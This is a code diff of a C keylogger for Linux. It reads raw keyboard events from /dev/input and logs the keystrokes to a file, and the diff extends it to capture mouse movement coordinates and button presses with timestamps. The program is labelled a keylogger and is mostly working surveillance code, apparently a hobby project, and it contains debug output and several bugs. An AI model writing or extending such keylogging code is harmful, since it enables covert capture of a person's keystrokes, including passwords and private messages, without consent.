@@ -11,6 +11,7 @@
 #include <unistd.h>
 #include <linux/input.h>
 #include <string.h>
+#include <X11/Xlib.h>
 
 #define NUM_KEYCODES 71
 
@@ -125,18 +126,32 @@ void write_to_out(int outfd, const char * str, int keyboard_fd){
     }
 }
 
-void keylogger_init(int keyboard_fd, int outfd){
+void keylogger_init(int keyboard_fd, int mouse_fd,  int outfd){
+    // keyboard variables
     int event_size = sizeof(struct input_event);
-    int bytes_read = 0;
+    int kbd_bytes_read = 0;
+    int mouse_bytes_read = 0;
     struct input_event events[128]; // replace 128 with NUM_EVENTS
+    struct input_event mouse_events[128];
     int i;
+
+    // mouse variables
+    Display *dpy;
+    Window root, child;
+    int rootX, rootY, winX, winY;
+    unsigned int mask;
+
+    dpy = XOpenDisplay(NULL);
+    XQueryPointer(dpy, DefaultRootWindow(dpy), &root, &child, &rootX, &rootY, &winX, &winY
+    , &mask);
 
     // write signal handler for sigint etc
 
     while(true){
-        bytes_read = read(keyboard_fd, events, event_size * 128);
+        kbd_bytes_read = read(keyboard_fd, events, event_size * 128);
 
-        for (int i = 0; i < (bytes_read/event_size); ++i){
+        // capturing the keyboard output
+        for (int i = 0; i < (kbd_bytes_read/event_size); ++i){
             if (events[i].type == EV_KEY){
                 if (events[i].value == 1){
                     if (events[i].code > 0 && events[i].code < NUM_KEYCODES){
@@ -148,8 +163,35 @@ void keylogger_init(int keyboard_fd, int outfd){
                 }
             }
         }
+
+
+        // capturing the mouse output
+        int mouse_bytes_read = read(mouse_fd, mouse_events, event_size * 128);
+
+        for (int i = 0; i < (mouse_bytes_read/event_size); ++i){
+            if (mouse_events[i].type == 2){
+                if (mouse_events[i].code == 0){rootX += mouse_events[i].value;}
+                else if (mouse_events[i].code == 1){rootY += mouse_events[i].value;}
+                char announcement[50] = {'\0'};
+                sprintf(announcement, "time%ld.%06ld\tx %d\ty %d\n", mouse_events[i].time.tv_sec, mouse_events[i].time.tv_usec, rootX, rootY);
+                write(outfd, announcement, sizeof(announcement));
+            } else if (mouse_events[i].type == 1){
+                if (mouse_events[i].code == 272){
+                    write(outfd, "MOUSE BUTTON ", sizeof("MOUSE BUTTON "));
+                    if (mouse_events[i].value == 0){
+                        write(outfd, "RELEASED\n", sizeof("RELEASED\n"));
+                    } 
+                    else if (mouse_events[i].value == 1){
+                        write(outfd, "PRESSED\n", sizeof("PRESSED\n"));
+                    }
+                }
+            }
+        }
+
+
+
     }
-    if (bytes_read > 0){
+    if ((kbd_bytes_read > 0)){
         write(outfd, "\n", keyboard_fd);
     }
 }
@@ -167,7 +209,74 @@ int is_keyboard_device(const struct dirent * file){
     return S_ISCHR(filestat.st_mode);
 }
 
-char * obtain_event_file(){
+int is_mouse_device(const struct dirent * file){
+    struct stat filestat;
+    char filename[512];
+
+    snprintf(filename, sizeof(filename), "%s%s", "/dev/input/", file->d_name);
+
+    int error = stat(filename, &filestat);
+    if (error){
+        return 0;
+    }
+    return S_ISCHR(filestat.st_mode);
+}
+
+char * obtain_mouse_event_file(){
+    char * mouse_file = NULL;
+    struct dirent ** event_files;
+    char filename[512];
+
+    int num = scandir("/dev/input/", &event_files, &is_mouse_device, &alphasort); 
+    if (num < 0){
+        return NULL;
+    } else {
+        for (int i = 0; i < num; i++){
+            int32_t event_bitmap = 0;
+            int fd;
+            int32_t mouse_bitmap = BTN_LEFT | BTN_RIGHT; // BTN_MOUSE;
+
+            printf("here\n");
+
+            snprintf(filename, sizeof(filename), "%s%s", "/dev/input/", event_files[i]->d_name);
+            printf("%s\n", filename);
+            
+            int mouse_fd = open(filename,O_RDONLY);
+
+            printf("got here\n");
+
+            if (mouse_fd < 0){
+                perror("open");
+                continue;
+            }
+
+            ioctl(mouse_fd, EVIOCGBIT(0, sizeof(event_bitmap)), &event_bitmap);
+            printf("got here too lmao and event bitmap is %d\n", event_bitmap);
+            if ((EV_ABS & event_bitmap) == EV_ABS){
+                // behaves like a mouse
+                ioctl(mouse_fd, EVIOCGBIT(EV_ABS, sizeof(event_bitmap)), &event_bitmap);
+                printf("got to here my lad\n");
+                printf("mouse bitmap: %d; event bitmap: %d\n", mouse_bitmap, event_bitmap);
+                if ((mouse_bitmap & event_bitmap) == mouse_bitmap){
+                    // device supports left click and right click so its probably a mouse
+                    printf("GOTTEM YEAAAA WOOO \n");
+                    mouse_file = strdup(filename);
+                    close(mouse_fd);
+                    break;
+                }
+            }
+
+            close(mouse_fd);
+        }
+    }
+    for (int i = 0; i < num; i++){
+        free(event_files[i]);
+    }
+    free(event_files);
+    return mouse_file;
+}
+
+char * obtain_keyboard_event_file(){
     char * keyboard_file = NULL;
     struct dirent ** event_files;
     char filename[512];
@@ -219,15 +328,21 @@ int main(int argc, char ** argv){
     }
 
     //check /dev/input directory for the keyboard input file
-    char * keyboard_device = obtain_event_file();
+    char * keyboard_device = obtain_keyboard_event_file();
     printf("keyboard file: %s\n", keyboard_device);
     if (keyboard_device == NULL){
-        fprintf(stderr, "Error: Keyboard device not connected.");
+        fprintf(stderr, "Error: Keyboard device not found.");
         exit(1);
     }
 
-    int output_fd;
-    output_fd = open(argv[1], O_WRONLY|O_APPEND|O_CREAT, S_IROTH);
+    const char * mouse_device = "/dev/input/event5";//obtain_mouse_event_file();  MALLOC THIS MAYBE
+    if (mouse_device == NULL){
+        fprintf(stderr, "Error: Mouse device not found.");
+        exit(1);
+    }
+    printf("mouse file: %s\n", mouse_device);
+
+    int output_fd = open(argv[1], O_WRONLY|O_APPEND|O_CREAT, S_IROTH);
     if (output_fd < 0){
         perror("output file: open");
     }
@@ -237,11 +352,19 @@ int main(int argc, char ** argv){
         perror("keyboard file: open");
     }
 
-    keylogger_init(keyboard_fd, output_fd);
+    int mouse_fd = open(mouse_device, O_RDONLY);
+    if (mouse_fd < 0){
+        perror("mouse file: open");
+    }
+
+    keylogger_init(keyboard_fd, mouse_fd, output_fd);
 
     close(keyboard_fd);
+    close(mouse_fd);
     close(output_fd);
     free(keyboard_device);
 
     return 0;
+
+
 }
